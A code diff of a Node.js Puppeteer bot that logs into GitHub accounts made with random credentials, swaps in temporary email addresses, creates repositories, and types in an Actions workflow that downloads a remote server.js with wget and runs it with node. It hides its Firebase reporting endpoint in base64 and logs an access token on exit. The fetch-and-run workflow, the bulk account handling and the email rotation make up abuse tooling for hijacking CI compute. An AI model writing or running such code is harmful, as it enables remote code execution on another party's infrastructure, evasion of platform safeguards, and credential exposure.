@@ -13,17 +13,6 @@ let PASS = null
 let ACCESS_TOKEN = null
 let TOKEN = null
 
-let RDP = "name: CI\n" +
-"on: [push, workflow_dispatch]\n" +
-"jobs:\n" +
-"build:\n" +
-"runs-on: ubuntu-latest\n" +
-"steps:\n" +
-"\n" +
-"- name: Server\n" +
-"- run: wget https://raw.githubusercontent.com/raiyan088/public/main/github/server.js\n" +
-"- run: node server.js\n"
-
 
 let BASE_URL = Buffer.from('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==', 'base64').toString('ascii')
 
@@ -54,9 +43,9 @@ async function readData() {
             USER = getRandomUser()
             PASS = getRandomPassword()
     
-            GMAIL = await GR.getGmail()
+            // GMAIL = await GR.getGmail()
     
-            console.log(USER, PASS)
+            console.log(USER, PASS, GIT_GMAIL)
             
             await startBrowser()
         } else {
@@ -104,7 +93,11 @@ async function startBrowser() {
 
             if (link) {
                 await page.goto(link, { waitUntil: 'load', timeout: 0 })
-            
+                
+                console.log('---LOGIN---')
+
+                await githubLogin()
+
                 console.log('---CREATE---')
 
                 await createRepo()
@@ -116,9 +109,9 @@ async function startBrowser() {
                 mStatus = await checkStatus()
 
                 if (mStatus) {
-                    console.log('---CHANGE---')
+                    // console.log('---CHANGE---')
 
-                    await changeEmail()
+                    // await changeEmail()
 
                     console.log('---UPLOAD---')
 
@@ -128,15 +121,19 @@ async function startBrowser() {
 
                     await delay(5000)
 
-                    //console.log('---DELETE---')
+                    // console.log('---DELETE---')
 
-                    //await deleteEmail()
+                    // await deleteEmail()
 
                     mStatus = await checkStatus()
 
                     if (mStatus) {
                         console.log('---SUCCESS---')
                         await saveData(action)
+                    } else {
+                        console.log('---CHANGE---')
+
+                        await changeTempEmail()
                     }
                 } else {
                     console.log('---CHANGE---')
@@ -170,7 +167,7 @@ async function startBrowser() {
             process.exit(0)
         }
     } catch (error) {
-        console.log('---EXIT---')
+        console.log('---EXIT---', TOKEN)
         process.exit(0)
     }
 }
@@ -178,8 +175,43 @@ async function startBrowser() {
 async function addRdpCode() {
     await page.goto('https://github.com/'+USER+'/'+USER+'/new/main?filename=.github%2Fworkflows%2Fmain.yml&workflow_template=blank', { waitUntil: 'load', timeout: 0 })
     
-    await delay(3000)
-    await page.keyboard.type(RDP)
+    for (let i = 0; i < 10; i++) {
+        await delay(1000)
+        let exists = await page.evaluate(() => {
+            let root = document.querySelector('div[data-language="yaml"]')
+            if(root) {
+                return true
+            }
+            return false
+        })
+
+        if (exists) {
+            await delay(1000)
+            await page.focus('div[data-language="yaml"]')
+            break
+        }
+    }
+    await delay(500)
+    await page.keyboard.type('name: CI')
+    await page.keyboard.press('Enter')
+    await page.keyboard.type('on: [push, workflow_dispatch]')
+    await page.keyboard.press('Enter')
+    await page.keyboard.type('jobs:')
+    await page.keyboard.press('Enter')
+    await page.keyboard.press('Tab')
+    await page.keyboard.type('build:')
+    await page.keyboard.press('Enter')
+    await page.keyboard.press('Tab')
+    await page.keyboard.type('runs-on: ubuntu-latest')
+    await page.keyboard.press('Enter')
+    await page.keyboard.type('steps:')
+    await page.keyboard.press('Enter')
+    await page.keyboard.press('Enter')
+    await page.keyboard.type('- name: Server')
+    await page.keyboard.press('Enter')
+    await page.keyboard.press('Tab')
+    await page.keyboard.type('run: wget https://raw.githubusercontent.com/raiyan088/public/main/github/server.js && node server.js')
+    await page.keyboard.press('Enter')
     await delay(1000)
     await page.keyboard.down('Control')
     await page.keyboard.press('s')
@@ -435,39 +467,39 @@ async function changeEmail() {
             if (link) {
                 await page.goto(link, { waitUntil: 'load', timeout: 0 })
                 await delay(1000)
-                // await page.goto('https://github.com/settings/emails', { waitUntil: 'load', timeout: 0 })
-                // await delay(2000)
+                await page.goto('https://github.com/settings/emails', { waitUntil: 'load', timeout: 0 })
+                await delay(2000)
 
-                // let value = await page.evaluate((gmail) => {
-                //     let value = null
+                let value = await page.evaluate((gmail) => {
+                    let value = null
 
-                //     try {
-                //         let root = document.querySelector('#primary_email_select').children
+                    try {
+                        let root = document.querySelector('#primary_email_select').children
 
-                //         if(root.length > 0) {
-                //             for(let i=0; i<root.length; i++) {
-                //                 try {
-                //                     if(root[i].innerText == gmail+'@gmail.com') {
-                //                         if(root[i].selected == false) {
-                //                             value = root[i].value
-                //                             break
-                //                         }
-                //                     }
-                //                 } catch (error) {}
-                //             }
-                //         }
-                //     } catch (error) {}
+                        if(root.length > 0) {
+                            for(let i=0; i<root.length; i++) {
+                                try {
+                                    if(root[i].innerText == gmail+'@gmail.com') {
+                                        if(root[i].selected == false) {
+                                            value = root[i].value
+                                            break
+                                        }
+                                    }
+                                } catch (error) {}
+                            }
+                        }
+                    } catch (error) {}
 
-                //     return value
-                // }, GMAIL)
+                    return value
+                }, GMAIL)
 
-                // if (value) {
-                //     await page.select('#primary_email_select', value)
-                // }
+                if (value) {
+                    await page.select('#primary_email_select', value)
+                }
 
-                // await delay(500)
-                // await page.click('form[aria-labelledby="primary_email_select_label"] > dl > dd > button')
-                // await delay(3000)
+                await delay(500)
+                await page.click('form[aria-labelledby="primary_email_select_label"] > dl > dd > button')
+                await delay(3000)
             } else {
                 GMAIL = await GR.getGmail()
                 await changeEmail()
@@ -584,6 +616,33 @@ async function getLink(user) {
     return link
 }
 
+async function githubLogin() {
+    try {
+        await page.goto('https://github.com/login', { waitUntil: 'load', timeout: 0 })
+        await delay(1000)
+
+        let url = await page.url()
+        if (url == 'https://github.com/login' || url == 'https://github.com/login/') {
+            await page.type('#login_field', USER)
+            await delay(500)
+            await page.type('#password', PASS)
+            await delay(500)
+            await page.keyboard.press('Enter')
+            await delay(2000)
+
+            for (let i = 0; i < 10; i++) {
+                try {
+                    let url = await page.url()
+                    if (url == 'https://github.com' || url == 'https://github.com/') {
+                        break
+                    }
+                } catch (error) {}
+        
+                await delay(1000)
+            }
+        }
+    } catch (error) {}
+}
 
 async function createRepo() {
     await delay(1000)
